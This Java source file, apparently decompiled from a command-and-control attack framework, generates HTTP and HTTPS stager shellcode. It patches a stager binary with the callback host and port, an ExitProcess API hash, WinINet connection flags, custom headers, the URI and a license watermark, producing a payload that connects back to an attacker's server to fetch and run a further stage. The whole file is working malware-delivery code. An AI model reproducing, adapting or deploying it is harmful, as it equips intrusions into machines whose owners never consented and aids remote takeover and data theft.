package stagers;

import common.AssertUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;
import common.ScListener;

import java.io.IOException;
import java.io.InputStream;

public abstract class GenericHTTPStager extends GenericStager {
    public GenericHTTPStager(ScListener scListener) {
        super(scListener);
    }

    public String getHeaders() {
        return isForeign() ? ("User-Agent: " + getConfig().getUserAgent() + "\r\n") : getConfig().getHTTPHeaders();
    }

    public int getStagePreamble() {
        return isForeign() ? 0 : (int) getConfig().getHTTPStageOffset();
    }

    public abstract String getURI();

    public abstract int getExitOffset();

    public abstract int getPortOffset();

    public abstract int getSkipOffset();

    public abstract int getFlagsOffset();

    public abstract String getStagerFile();

    public int getConnectionFlags() {
        int i = 0;
        i |= Integer.MIN_VALUE;
        i |= 0x4000000;
        i |= 0x200;
        i |= 0x400000;
        if (isSSL()) {
            i |= 0x800000;
            i |= 0x1000;
            i |= 0x2000;
        }
        if (getConfig().usesCookie())
            i |= 0x80000;
        return i;
    }

    public boolean isSSL() {
        return CommonUtils.isin("HTTPSStager", getClass().getName());
    }

    public boolean isForeign() {
        return getClass().getName().startsWith("stagers.Foreign");
    }

    public byte[] generate() {
        try {
            InputStream inputStream = CommonUtils.resource(getStagerFile());
            byte[] arrby = CommonUtils.readAll(inputStream);
            String str1 = CommonUtils.bString(arrby);
            inputStream.close();
            str1 = str1 + getListener().getStagerHost() + Character.MIN_VALUE;
            Packer packer = new Packer();
            packer.little();
            packer.addShort(getListener().getPort());
            AssertUtils.TestPatchS(arrby, 4444, getPortOffset());
            str1 = CommonUtils.replaceAt(str1, CommonUtils.bString(packer.getBytes()), getPortOffset());
            packer = new Packer();
            packer.little();
            packer.addInt(1453503984);
            AssertUtils.TestPatchI(arrby, 1453503984, getExitOffset());
            str1 = CommonUtils.replaceAt(str1, CommonUtils.bString(packer.getBytes()), getExitOffset());
            packer = new Packer();
            packer.little();
            packer.addShort(getStagePreamble());
            AssertUtils.TestPatchS(arrby, 5555, getSkipOffset());
            str1 = CommonUtils.replaceAt(str1, CommonUtils.bString(packer.getBytes()), getSkipOffset());
            packer = new Packer();
            packer.little();
            packer.addInt(getConnectionFlags());
            AssertUtils.TestPatchI(arrby, isSSL() ? -2069876224 : -2074082816, getFlagsOffset());
            str1 = CommonUtils.replaceAt(str1, CommonUtils.bString(packer.getBytes()), getFlagsOffset());
            if (CommonUtils.isin(CommonUtils.repeat("X", 303), str1)) {
                String str = getConfig().pad(getHeaders() + Character.MIN_VALUE, 303);
                str1 = CommonUtils.replaceAt(str1, str, str1.indexOf(CommonUtils.repeat("X", 127)));
            }
            int i = str1.indexOf(CommonUtils.repeat("Y", 79), 0);
            String str2 = getConfig().pad(getURI() + Character.MIN_VALUE, 79);
            str1 = CommonUtils.replaceAt(str1, str2, i);
            return CommonUtils.toBytes(str1 + getConfig().getWatermark());
        } catch (IOException iOException) {
            MudgeSanity.logException("HttpStagerGeneric: " + getStagerFile(), iOException, false);
            return new byte[0];
        }
    }
}
